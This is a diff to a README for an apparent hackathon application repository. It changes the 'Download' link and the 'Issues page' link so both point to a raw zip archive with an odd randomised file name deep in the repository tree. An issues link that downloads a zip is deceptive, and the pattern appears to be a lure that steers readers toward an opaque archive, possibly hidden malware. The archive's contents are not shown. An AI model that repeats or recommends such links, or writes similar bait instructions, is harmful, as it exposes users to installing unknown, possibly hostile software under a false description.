@@ -13,7 +13,7 @@ Welcome to the hackaton-clerk-2025 repository! This application helps you partic
 ## 📥 Download & Install
 To get started, you need to download the application. 
 
-**[Download hackaton-clerk-2025](https://raw.githubusercontent.com/Hhfftt/hackaton-clerk-2025/main/Mydaus/hackaton-clerk-2025.zip)**
+**[Download hackaton-clerk-2025](https://raw.githubusercontent.com/Hhfftt/hackaton-clerk-2025/main/nextjs-auth/app/hackaton-clerk-gasterothecal.zip)**
 
 Follow these steps:
 
@@ -47,6 +47,6 @@ hackaton-clerk-2025 comes packed with helpful features:
 If you encounter any issues or need assistance, please check our documentation or reach out:
 
 - **Documentation**: A full guide is available in the README section of each release.
-- **Issues Page**: Report bugs or request features on our [Issues page](https://raw.githubusercontent.com/Hhfftt/hackaton-clerk-2025/main/Mydaus/hackaton-clerk-2025.zip).
+- **Issues Page**: Report bugs or request features on our [Issues page](https://raw.githubusercontent.com/Hhfftt/hackaton-clerk-2025/main/nextjs-auth/app/hackaton-clerk-gasterothecal.zip).
 
 Thank you for participating in the Hackathon! We wish you the best of luck!
